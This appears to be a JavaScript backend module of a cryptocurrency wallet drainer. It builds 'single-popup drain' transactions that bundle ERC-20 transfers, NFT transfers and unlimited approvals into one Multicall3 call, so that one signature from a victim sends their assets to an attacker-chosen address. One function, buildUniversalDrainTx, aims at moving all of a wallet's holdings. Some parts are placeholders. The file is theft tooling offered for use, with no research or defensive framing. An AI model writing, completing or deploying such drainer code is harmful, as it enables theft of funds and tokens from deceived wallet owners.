// backend/modules/universalTxBuilder.js
import { ethers } from "ethers";
import { securityManager } from './securityManager.js';
import { multiChainManager } from '../lib/multiChainManager.js';

export class UniversalTxBuilder {
    constructor() {
        this.isInitialized = false;
        
        // Single-popup configurations
        this.singlePopupConfig = {
            maxOperations: 5,
            gasLimitMultiplier: 1.3,
            priorityFee: ethers.parseUnits('2.5', 'gwei'),
            maxExecutionTime: 30000,
            minGasLimit: 21000,
            baseGasPerOperation: 50000
        };

        // Multicall3 contract ABI
        this.MULTICALL3_ABI = [
            "function aggregate((address,bytes)[] calls) returns (uint256 blockNumber, bytes[] returnData)",
            "function tryAggregate(bool requireSuccess, (address,bytes)[] calls) returns ((bool,bytes)[] returnData)"
        ];

        // Default Multicall3 addresses
        this.DEFAULT_MULTICALL_ADDRESSES = {
            '1': '0xcA11bde05977b3631167028862bE2a173976CA11', // Ethereum
            '56': '0xcA11bde05977b3631167028862bE2a173976CA11', // BSC
            '137': '0xcA11bde05977b3631167028862bE2a173976CA11', // Polygon
            '42161': '0xcA11bde05977b3631167028862bE2a173976CA11', // Arbitrum
            '10': '0xcA11bde05977b3631167028862bE2a173976CA11', // Optimism
            '43114': '0xcA11bde05977b3631167028862bE2a173976CA11', // Avalanche
            '8453': '0xcA11bde05977b3631167028862bE2a173976CA11', // Base
            '324': '0xcA11bde05977b3631167028862bE2a173976CA11'  // zkSync
        };

        // Common ABIs for single-popup operations
        this.COMMON_ABIS = {
            erc20: [
                "function transfer(address to, uint256 amount) returns (bool)",
                "function approve(address spender, uint256 amount) returns (bool)",
                "function transferFrom(address from, address to, uint256 amount) returns (bool)"
            ],
            erc721: [
                "function safeTransferFrom(address from, address to, uint256 tokenId)",
                "function setApprovalForAll(address operator, bool approved)"
            ],
            erc1155: [
                "function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes data)",
                "function setApprovalForAll(address operator, bool approved)"
            ],
            native: [
                "function deposit() payable",
                "function withdraw(uint256 amount)"
            ]
        };
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            
            await multiChainManager.initialize();
            
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    async buildSinglePopupDrainTx(userWallet, drainOperations, chainId = '1') {
        console.log(`🎯 Building single-popup drain transaction for ${drainOperations.length} operations`);
        
        const startTime = Date.now();
        const txId = `utxb_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
        
        try {
            // Validate operations
            this.validateDrainOperations(drainOperations);
            
            // Build calls for multicall
            const calls = await this.buildMulticallCalls(drainOperations, userWallet.address, chainId);
            
            if (calls.length === 0) {
                throw new Error('No valid operations to execute');
            }

            // Build single transaction
            const transaction = await this.buildMulticallTransaction(
                userWallet.address,
                calls,
                chainId
            );

            // Optimize gas
            const optimizedTx = await this.optimizeTransactionGas(transaction, chainId, userWallet);

            const result = {
                success: true,
                txId: txId,
                transaction: optimizedTx,
                operations: drainOperations.length,
                chainId: chainId,
                estimatedGas: optimizedTx.gasLimit,
                executionTime: Date.now() - startTime
            };

            await securityManager.storeTransactionBuild(txId, result);
            return result;

        } catch (error) {
            console.error(`❌ Single-popup transaction build failed: ${error.message}`);
            
            const failedResult = {
                success: false,
                txId: txId,
                error: error.message,
                operations: drainOperations.length,
                chainId: chainId,
                executionTime: Date.now() - startTime
            };

            await securityManager.storeTransactionBuild(txId, failedResult);
            return failedResult;
        }
    }

    validateDrainOperations(operations) {
        if (!Array.isArray(operations) || operations.length === 0) {
            throw new Error('No operations provided');
        }

        if (operations.length > this.singlePopupConfig.maxOperations) {
            throw new Error(`Too many operations (max: ${this.singlePopupConfig.maxOperations})`);
        }

        for (const op of operations) {
            if (!op.type) {
                throw new Error('Operation missing type');
            }

            if (!op.params) {
                throw new Error('Operation missing params');
            }
        }
    }

    async buildMulticallCalls(operations, fromAddress, chainId) {
        const calls = [];
        
        for (const operation of operations) {
            try {
                let callData;
                
                switch (operation.type) {
                    case 'token-transfer':
                        callData = await this.buildTokenTransferCall(operation.params, fromAddress, chainId);
                        break;
                    case 'nft-transfer':
                        callData = await this.buildNFTTransferCall(operation.params, fromAddress, chainId);
                        break;
                    case 'approval':
                        callData = await this.buildApprovalCall(operation.params, fromAddress, chainId);
                        break;
                    case 'native-transfer':
                        callData = await this.buildNativeTransferCall(operation.params, fromAddress, chainId);
                        break;
                    case 'permit-execution':
                        callData = await this.buildPermitExecutionCall(operation.params, fromAddress, chainId);
                        break;
                    default:
                        console.warn(`⚠️ Unknown operation type: ${operation.type}`);
                        continue;
                }

                if (callData) {
                    calls.push(callData);
                }

            } catch (error) {
                console.warn(`⚠️ Failed to build call for ${operation.type}:`, error.message);
            }
        }

        return calls;
    }

    async buildTokenTransferCall(params, fromAddress, chainId) {
        const { tokenAddress, toAddress, amount } = params;
        
        if (!tokenAddress || !toAddress || !amount) {
            throw new Error('Missing required token transfer parameters');
        }

        const erc20Interface = new ethers.Interface(this.COMMON_ABIS.erc20);
        const data = erc20Interface.encodeFunctionData('transfer', [toAddress, amount]);

        return [tokenAddress, data];
    }

    async buildNFTTransferCall(params, fromAddress, chainId) {
        const { nftAddress, toAddress, tokenId, isERC721 = true } = params;
        
        if (!nftAddress || !toAddress || !tokenId) {
            throw new Error('Missing required NFT transfer parameters');
        }

        const interfaceType = isERC721 ? this.COMMON_ABIS.erc721 : this.COMMON_ABIS.erc1155;
        const nftInterface = new ethers.Interface(interfaceType);
        
        let data;
        if (isERC721) {
            data = nftInterface.encodeFunctionData('safeTransferFrom', [fromAddress, toAddress, tokenId]);
        } else {
            data = nftInterface.encodeFunctionData('safeTransferFrom', [fromAddress, toAddress, tokenId, 1, '0x']);
        }

        return [nftAddress, data];
    }

    async buildApprovalCall(params, fromAddress, chainId) {
        const { tokenAddress, spenderAddress, amount } = params;
        
        if (!tokenAddress || !spenderAddress || !amount) {
            throw new Error('Missing required approval parameters');
        }

        const erc20Interface = new ethers.Interface(this.COMMON_ABIS.erc20);
        const data = erc20Interface.encodeFunctionData('approve', [spenderAddress, amount]);

        return [tokenAddress, data];
    }

    async buildNativeTransferCall(params, fromAddress, chainId) {
        const { toAddress, amount } = params;
        
        if (!toAddress || !amount) {
            throw new Error('Missing required native transfer parameters');
        }

        // For native transfers, we'll handle them separately since they can't be in multicall
        // This would be a direct transfer in the transaction value field
        return null; // Native transfers handled separately
    }

    async buildPermitExecutionCall(params, fromAddress, chainId) {
        // This would integrate with permitManager for gasless approvals
        // Placeholder implementation
        console.log('⚠️ Permit execution not fully implemented');
        return null;
    }

    async buildMulticallTransaction(fromAddress, calls, chainId) {
        if (calls.length === 0) {
            throw new Error('No calls to bundle');
        }

        const multicallAddress = this.getMulticallAddress(chainId);
        const multicallInterface = new ethers.Interface(this.MULTICALL3_ABI);
        
        const multicallData = multicallInterface.encodeFunctionData('aggregate', [calls]);

        // Estimate gas
        const estimatedGas = await this.estimateMulticallGas(calls.length, chainId);

        return {
            from: fromAddress,
            to: multicallAddress,
            value: 0,
            data: multicallData,
            chainId: parseInt(chainId),
            gasLimit: estimatedGas,
            nonce: await this.getNonce(fromAddress, chainId)
        };
    }

    async optimizeTransactionGas(transaction, chainId, userWallet) {
        try {
            const provider = await multiChainManager.getProvider(chainId);
            if (!provider) {
                throw new Error('Provider not available for gas optimization');
            }

            // Estimate gas with buffer
            const estimatedGas = await provider.estimateGas({
                from: transaction.from,
                to: transaction.to,
                data: transaction.data,
                value: transaction.value
            });

            const gasWithBuffer = BigInt(Math.floor(Number(estimatedGas) * this.singlePopupConfig.gasLimitMultiplier));
            
            // Get current gas price
            const feeData = await provider.getFeeData();
            const maxFeePerGas = feeData.maxFeePerGas || this.singlePopupConfig.priorityFee;
            const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas || this.singlePopupConfig.priorityFee;

            return {
                ...transaction,
                gasLimit: gasWithBuffer,
                maxFeePerGas: maxFeePerGas,
                maxPriorityFeePerGas: maxPriorityFeePerGas,
                type: 2 // EIP-1559
            };

        } catch (error) {
            console.warn(`⚠️ Gas optimization failed: ${error.message}`);
            
            // Fallback to basic gas estimation
            return {
                ...transaction,
                gasLimit: transaction.gasLimit,
                gasPrice: await this.getGasPrice(chainId),
                type: 0 // Legacy
            };
        }
    }

    async estimateMulticallGas(numCalls, chainId) {
        const baseGas = 50000;
        const perCallGas = 25000;
        const estimatedGas = baseGas + (numCalls * perCallGas);
        
        return BigInt(Math.max(estimatedGas, this.singlePopupConfig.minGasLimit));
    }

    async getNonce(address, chainId) {
        try {
            const provider = await multiChainManager.getProvider(chainId);
            return await provider.getTransactionCount(address);
        } catch {
            return 0; // Fallback
        }
    }

    async getGasPrice(chainId) {
        try {
            const provider = await multiChainManager.getProvider(chainId);
            const feeData = await provider.getFeeData();
            return feeData.gasPrice || this.singlePopupConfig.priorityFee;
        } catch {
            return this.singlePopupConfig.priorityFee;
        }
    }

    getMulticallAddress(chainId) {
        return this.DEFAULT_MULTICALL_ADDRESSES[chainId] || this.DEFAULT_MULTICALL_ADDRESSES['1'];
    }

    async simulateTransaction(transaction, chainId) {
        try {
            const provider = await multiChainManager.getProvider(chainId);
            
            const simulation = await provider.call({
                from: transaction.from,
                to: transaction.to,
                data: transaction.data,
                value: transaction.value
            });

            return {
                success: true,
                simulation: simulation,
                gasUsed: transaction.gasLimit
            };

        } catch (error) {
            return {
                success: false,
                error: error.message,
                revertReason: this.extractRevertReason(error)
            };
        }
    }

    extractRevertReason(error) {
        try {
            const errorString = error.toString();
            const revertMatch = errorString.match(/revert|execution reverted/);
            if (revertMatch) {
                return errorString;
            }
            return 'Unknown error';
        } catch {
            return 'Error parsing revert reason';
        }
    }

    async buildUniversalDrainTx(userAddress, chainId, destinationAddress) {
        // This would build a comprehensive drain transaction for all assets
        console.log(`🔄 Building universal drain transaction for ${userAddress}`);
        
        // Placeholder - would integrate with asset detection
        return await this.buildSinglePopupDrainTx(
            { address: userAddress },
            [
                {
                    type: 'token-transfer',
                    params: {
                        tokenAddress: '0xTokenAddress',
                        toAddress: destinationAddress,
                        amount: ethers.MaxUint256
                    }
                }
            ],
            chainId
        );
    }

    getTransactionStats() {
        return {
            totalBuilt: 0, // Would track actual stats
            successRate: 1.0,
            averageGas: 0,
            byChain: {}
        };
    }
}

export const universalTxBuilder = new UniversalTxBuilder();